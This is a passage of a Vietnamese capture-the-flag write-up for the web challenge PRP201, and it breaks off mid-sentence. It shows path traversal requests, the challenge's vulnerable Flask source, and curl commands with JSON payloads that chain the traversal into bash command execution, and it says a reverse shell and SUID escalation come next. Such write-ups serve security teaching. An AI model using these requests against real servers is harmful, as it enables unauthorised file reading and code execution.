<!DOCTYPE html><html lang="vi" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="FPTU SecAthon 2021 Web Writeup PRP201" /><meta name="author" content="phucdc-noob" /><meta property="og:locale" content="vi" /><meta name="description" content="PRP201" /><meta property="og:description" content="PRP201" /><link rel="canonical" href="https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/" /><meta property="og:url" content="https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/" /><meta property="og:site_name" content="Ethical Hackers Club" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-10-10T23:30:00+07:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="FPTU SecAthon 2021 Web Writeup PRP201" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@phucdc-noob" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2021-10-10T23:30:00+07:00","datePublished":"2021-10-10T23:30:00+07:00","description":"PRP201","mainEntityOfPage":{"@type":"WebPage","@id":"https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/"},"url":"https://fptu-ethical-hackers-club.github.io/posts/FuSec4-PRP201/","@type":"BlogPosting","author":{"@type":"Person","name":"phucdc-noob"},"headline":"FPTU SecAthon 2021 Web Writeup PRP201","@context":"https://schema.org"}</script><title>FPTU SecAthon 2021 | Web Writeup | PRP201 | Ethical Hackers Club</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ethical Hackers Club"><meta name="application-name" content="Ethical Hackers Club"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.updateMermaid(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ethical Hackers Club</a></div><div class="site-subtitle font-italic">FPT University</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a id="mode-toggle-wrapper" tabindex="0" onclick="flipMode()"> <i class="mode-toggle fas fa-adjust"></i> </a> <span class="icon-border"></span> <a href="https://github.com/FPTU-Ethical-Hackers-Club" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://facebook.com/ehc.fptu" aria-label="facebook" target="_blank" rel="noopener"> <i class="fab fa-facebook"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['ehc.fpt','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>FPTU SecAthon 2021 | Web Writeup | PRP201</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>FPTU SecAthon 2021 | Web Writeup | PRP201</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/phucdc-noob">phucdc-noob</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2021-10-10 23:30:00 +0700" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 10, 2021, 11:30 PM +0700" >Oct 10</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1498 words"> <em>8 min</em> read</span></div></div></div><div class="post-content"><h1 id="prp201">PRP201</h1><blockquote><p>Đây là challenge mà mình đã đoán được một phần, nhưng vẫn mất gần 1 ngày để giải ra :&lt; Một sản phẩm đến từ anh Khoa (matuhn)</p></blockquote><ul><li><p>Truy cập vào bài thì thấy có 5 đường dẫn đến 5 file txt</p><li><p>Thử truy cập vào một trong số đó sẽ thấy URL có dạng: <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/getData?f=/fus/data/1.txt</code>, liệu đây có phải path traversal? có vẻ như các anh ra đề năm nay khá thích path traversal</p><li><p>Mò mẫm một lúc thì mình tìm được file <code class="language-plaintext highlighter-rouge">flag.txt</code> cũng trong <code class="language-plaintext highlighter-rouge">/fus/data</code> :D với nội dung như sau:</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_1.png" alt="flag.txt" /></p><li><p>Vậy là cần phải làm cách nào đó để xem được cái <code class="language-plaintext highlighter-rouge">secret_service</code> đó</p><li><p>Đến đây thì mình bắt đầu bí rồi, path traversal thì cũng cần phải biết có những gì trong đó chứ (hoặc ít nhất là mình nghĩ vậy), cho tới khi ban ra đề cho hint đầu tiên: <code class="language-plaintext highlighter-rouge">?f=/fus/data/../app.py</code>, vậy hãy xem source code này có vấn đề gì?</p><li><p>Vì source khá dài nên mình sẽ phân tích từng hàm một, bỏ qua hàm index, vì nó in ra trang mà chúng ta truy cập vào đầu tiên</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>      <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/getData'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">])</span>
      <span class="k">def</span> <span class="nf">getLog</span><span class="p">():</span>
          <span class="n">log_file</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'f'</span><span class="p">)</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">log_file</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'/fus/data'</span><span class="p">)):</span>
              <span class="k">return</span> <span class="n">flask</span><span class="p">.</span><span class="n">send_file</span><span class="p">(</span><span class="n">log_file</span><span class="p">,</span> <span class="n">mimetype</span><span class="o">=</span><span class="s">'text/plain'</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="k">return</span> <span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="s">'invalid path'</span><span class="p">},</span><span class="mi">200</span><span class="p">)</span>
</pre></table></code></div></div><li><p>Ok, đây chính là hàm mà chúng ta dùng để đọc file và thực hiện path traversal, không có nhiều điều để nói về nó.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
</pre><td class="rouge-code"><pre>      <span class="c1"># run script to crawl data
</span>      <span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/runScript'</span><span class="p">)</span>
      <span class="k">def</span> <span class="nf">runScript</span><span class="p">():</span>
          <span class="n">json</span> <span class="o">=</span> <span class="n">flask</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">json</span>
          <span class="n">msg</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">json</span><span class="p">)</span>
          <span class="k">return</span> <span class="p">({</span><span class="s">'status'</span><span class="p">:</span> <span class="n">msg</span><span class="p">},</span><span class="mi">200</span><span class="p">)</span>

      <span class="k">def</span> <span class="nf">check_script_dup</span><span class="p">(</span><span class="n">scripts</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">):</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">script_parent_dir</span> <span class="o">=</span> <span class="n">scripts</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'dir'</span><span class="p">]</span>
              <span class="n">script_path</span> <span class="o">=</span> <span class="n">script_parent_dir</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'name'</span><span class="p">]</span>
          <span class="k">except</span><span class="p">:</span>
              <span class="k">return</span> <span class="s">"missing dir and name"</span>
          <span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">script_path</span><span class="p">):</span>
              <span class="k">return</span> <span class="s">"duplicate script"</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">script_parent_dir</span><span class="p">):</span>
                  <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">script_parent_dir</span><span class="p">)</span>
              <span class="k">return</span> <span class="n">download_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">)</span>

      <span class="k">def</span> <span class="nf">download_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">):</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">script_link</span> <span class="o">=</span> <span class="n">json</span><span class="p">[</span><span class="s">'url'</span><span class="p">]</span>
          <span class="k">except</span><span class="p">:</span>
              <span class="k">return</span> <span class="s">"missing url"</span>
          <span class="c1"># don't trust anyone
</span>          <span class="k">if</span> <span class="p">(</span><span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">script_link</span><span class="p">).</span><span class="n">netloc</span> <span class="o">==</span> <span class="s">"localhost:8888"</span><span class="p">):</span>
              <span class="n">result</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">script_link</span><span class="p">)</span>
              <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                  <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">.</span><span class="n">content</span><span class="p">)</span>
                  <span class="n">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">)</span>
          <span class="k">else</span><span class="p">:</span>
              <span class="k">return</span> <span class="s">"invalid script link"</span>

      <span class="k">def</span> <span class="nf">run_script</span><span class="p">(</span><span class="n">script_path</span><span class="p">,</span> <span class="n">command_log</span><span class="p">):</span>
          <span class="n">lf</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">command_log</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span>
          <span class="n">command</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">([</span><span class="s">'bash'</span><span class="p">,</span> <span class="n">script_path</span><span class="p">],</span> <span class="n">stderr</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">lf</span><span class="p">,</span> <span class="n">universal_newlines</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
          <span class="k">return</span> <span class="s">"Run successfully"</span>

      <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">json</span><span class="p">):</span>
          <span class="n">scripts</span> <span class="o">=</span> <span class="n">home</span> <span class="o">+</span> <span class="s">'/scripts'</span>
          <span class="n">log</span> <span class="o">=</span> <span class="n">home</span> <span class="o">+</span> <span class="s">'/logs'</span>
          <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">scripts</span><span class="p">):</span>
              <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">scripts</span><span class="p">)</span>
          <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">log</span><span class="p">):</span>
              <span class="n">os</span><span class="p">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">log</span><span class="p">)</span>
          <span class="k">try</span><span class="p">:</span>
              <span class="n">command_log</span> <span class="o">=</span> <span class="n">log</span> <span class="o">+</span> <span class="s">'/'</span> <span class="o">+</span> <span class="n">json</span><span class="p">[</span><span class="s">'command_log'</span><span class="p">]</span> <span class="o">+</span> <span class="s">'.txt'</span>
          <span class="k">except</span><span class="p">:</span>
              <span class="k">return</span> <span class="s">"missing command_log"</span>
          <span class="n">msg</span> <span class="o">=</span> <span class="n">check_script_dup</span><span class="p">(</span><span class="n">scripts</span><span class="p">,</span> <span class="n">command_log</span><span class="p">,</span> <span class="n">json</span><span class="p">)</span>
          <span class="k">return</span> <span class="n">msg</span>
</pre></table></code></div></div><li><p>Mình sẽ để cả 5 hàm này chung với nhau, vì chúng liên quan mật thiết với nhau, và cũng là tiền đề cho mọi thứ</p><li><p>Ta có thứ tự như sau:</p><ul><li><p><code class="language-plaintext highlighter-rouge">runScript()</code> nhận json từ request và truyền cho hàm <code class="language-plaintext highlighter-rouge">start()</code></p><ul><li><p><code class="language-plaintext highlighter-rouge">start()</code> xử lý việc tạo ra đường dẫn thư mục cho <code class="language-plaintext highlighter-rouge">logs</code>, <code class="language-plaintext highlighter-rouge">scripts</code> và tạo file <code class="language-plaintext highlighter-rouge">command_log</code> và đưa vào hàm <code class="language-plaintext highlighter-rouge">check_script_dup()</code></p><li><p><code class="language-plaintext highlighter-rouge">check_script_dup()</code> nôm na thì kiểm tra xem file script đã tồn tại hay không, nếu tồn tại thì tất nhiên là không cần mất công đến hàm tiếp theo, hàm <code class="language-plaintext highlighter-rouge">download_script()</code></p><li><p><code class="language-plaintext highlighter-rouge">download_script()</code> là phần sẽ “tạo ra nội dung file”, bằng cách nhập file từ <code class="language-plaintext highlighter-rouge">url</code> trong JSON vào file <code class="language-plaintext highlighter-rouge">script</code>, ở đây ta biết được rằng, <code class="language-plaintext highlighter-rouge">url</code> đó sẽ có dạng <code class="language-plaintext highlighter-rouge">http://localhost:8888/anything_else</code> vì đoạn <code class="language-plaintext highlighter-rouge">#dont trust anyone</code>, hãy nhớ điều này</p><li><p>Sau khi <code class="language-plaintext highlighter-rouge">download_script()</code> hoàn tất, hàm <code class="language-plaintext highlighter-rouge">run_script()</code> được khởi động, hàm này sẽ chạy một câu lệnh <code class="language-plaintext highlighter-rouge">bash &lt;script_bash&gt;</code>, và từ đây ta hiểu được 2 điều:</p><ul><li><p><code class="language-plaintext highlighter-rouge">script_bash</code> là tên file được thực thi bới lệnh <code class="language-plaintext highlighter-rouge">bash</code>, có nội dung được nhập từ nôi dung file trên <code class="language-plaintext highlighter-rouge">url</code> của JSON truyền vào</p><li><p><code class="language-plaintext highlighter-rouge">command_log</code> chính là file log của <code class="language-plaintext highlighter-rouge">stdout</code> và <code class="language-plaintext highlighter-rouge">stderr</code>, như vậy khi thực thi, output và thông báo lỗi của <code class="language-plaintext highlighter-rouge">bash</code> đều sẽ đẩy vào file log đó, và tất nhiên, ta có thể xem file log đó qua path traversal</p></ul></ul></ul><li><p>Đến đây thì mình (và tin chắc ai đó khi xem WU này), chắc hẳn đều đã nghĩ ra rồi, tác giả cũng đã ra hint <code class="language-plaintext highlighter-rouge">suprocess.Popen(), stderr, stdout là gì?</code> rồi :v</p><li><p>Mình thử luôn nhé :v Như ở trên ta đã có JSON bao gồm <code class="language-plaintext highlighter-rouge">dir</code>, <code class="language-plaintext highlighter-rouge">name</code>, <code class="language-plaintext highlighter-rouge">command_log</code>, <code class="language-plaintext highlighter-rouge">url</code></p><li><p>URL để nhận file JSON là <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/runScript</code>, để gửi JSON lên thì mình sử dụng <code class="language-plaintext highlighter-rouge">curl</code> như sau:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{json}'</span>
</pre></table></code></div></div><li><p>Mình sẽ thử tạo một JSON như sau:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="w">      </span><span class="p">{</span><span class="w">
          </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ls"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"log"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/"</span><span class="w">
      </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><li><p>Ghép lại với <code class="language-plaintext highlighter-rouge">curl</code>:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "test", "name" : "ls", "command_log" : "log", "url" : "http://localhost:8888/"}'</span>
</pre></table></code></div></div><li><p>Và sau khi gửi, truy cập vào <code class="language-plaintext highlighter-rouge">http://139.180.208.121:8001/getData?f=/fus/data/../logs/log.txt</code> để xem kết quả của câu lệnh là gì (ta biết <code class="language-plaintext highlighter-rouge">logs</code> cùng chung thư mục cha với <code class="language-plaintext highlighter-rouge">data</code> khi xem code):</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_2.png" alt="curl" /></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_3.png" alt="log.txt" /></p><li><p>Có thể thấy rằng, nội dung file chính<code class="language-plaintext highlighter-rouge">log.txt</code> chính là biến <code class="language-plaintext highlighter-rouge">script_path</code> được ra thêm cả <code class="language-plaintext highlighter-rouge">response</code> của <code class="language-plaintext highlighter-rouge">index()</code>, chúng trên một dòng nên sẽ bị lỗi, thử đổi <code class="language-plaintext highlighter-rouge">ls</code> thành <code class="language-plaintext highlighter-rouge">\nls\n</code> ở JSON và gửi lên, sẽ thấy sự khác biệt:</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_4.png" alt="curl_1" /></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_5.png" alt="log.txt_1" /></p><li><p>Thấy rõ là <code class="language-plaintext highlighter-rouge">ls</code> đã thụt xuống, vậy điều này có ý nghĩa gì? <code class="language-plaintext highlighter-rouge">bash &lt;filename&gt;</code> khi chạy sẽ chạy từ trên xuống như các ngôn ngữ lập trình, nhưng có một điều đặc biệt là, hàng nào lỗi, nó sẽ in ra lỗi và chạy hàng tiếp theo, chứ không dừng lại khi gặp lỗi syntax bên trong</p><li><p>Đến đây thì mình đã nhận ra, hàm <code class="language-plaintext highlighter-rouge">download_script()</code>, vậy sẽ ra sao nếu mình truyền vào <code class="language-plaintext highlighter-rouge">url</code> trong JSON là <code class="language-plaintext highlighter-rouge">http://localhost:8888/getData?f=/fus/data/../logs/log.txt</code> (nên lưu ý <code class="language-plaintext highlighter-rouge">localhost</code> ở đây là local của server :&gt; ), thì có phải <code class="language-plaintext highlighter-rouge">download_script()</code> sẽ lấy nội dung của <code class="language-plaintext highlighter-rouge">log.txt</code> để đưa vào <code class="language-plaintext highlighter-rouge">script_path</code>?</p><li><p>Như vậy mình tạo JSON mới và lệnh <code class="language-plaintext highlighter-rouge">curl</code> mới như sau:</p><div class="language-json highlighter-rouge"><div class="code-header"> <span label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="w">      </span><span class="p">{</span><span class="w">
          </span><span class="nl">"dir"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"test"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"name"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"ls.sh"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"command_log"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"lssh"</span><span class="p">,</span><span class="w">
          </span><span class="nl">"url"</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s2">"http://localhost:8888/getData?f=/fus/data/../logs/log.txt"</span><span class="w">
      </span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><div class="language-shell highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>      curl <span class="nt">-X</span> GET http://139.180.208.121:8001/runScript <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"dir" : "test", "name" : "ls.sh", "command_log" : "lssh", "url" : "http://localhost:8888/getData?f=/fus/data/../logs/log.txt"}'</span>
</pre></table></code></div></div><li><p>Và gửi đi, giờ chỉ cần mở file <code class="language-plaintext highlighter-rouge">lssh.txt</code> bằng path traversal và thu được kết quả:</p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_6.png" alt="curl_2" /></p><p><img data-proofer-ignore data-src="https://raw.githubusercontent.com/phucdc-noob/FUSec-Write-Ups/main/img/PRP201_7.png" alt="lssh.txt" /></p><li><p>Vậy là chính xác rồi, nhưng có một vấn đề là ta cần tìm đến <code class="language-plaintext highlighter-rouge">/root</code> để mở file <code class="language-plaintext highlighter-rouge">secret_service</code>, và tất nhiên là phải root thì mới có thể làm được điều đó (mình đã thử rồi)</p><li><p>Mụ mẫm cả đầu thì anh T giấu tên và anh Khoa (tác giả) đã gợi ý về <code class="language-plaintext highlighter-rouge">reverse shell</code></p><li><p>Vậy bây giờ chỉ cần dùng cách trên, tạo một file chạy một đoạn reverse shell và chúng ta sẽ chiếm quyền thông qua SUID (hint từ tác giả) là xong</p><li><p>Nhưng, mình đã thử và nhận ra, tất cả những command mà chứa dấu ‘/’ thì lỗi 500 là rõ, như ở dưới mình để <code class="language-plaintext 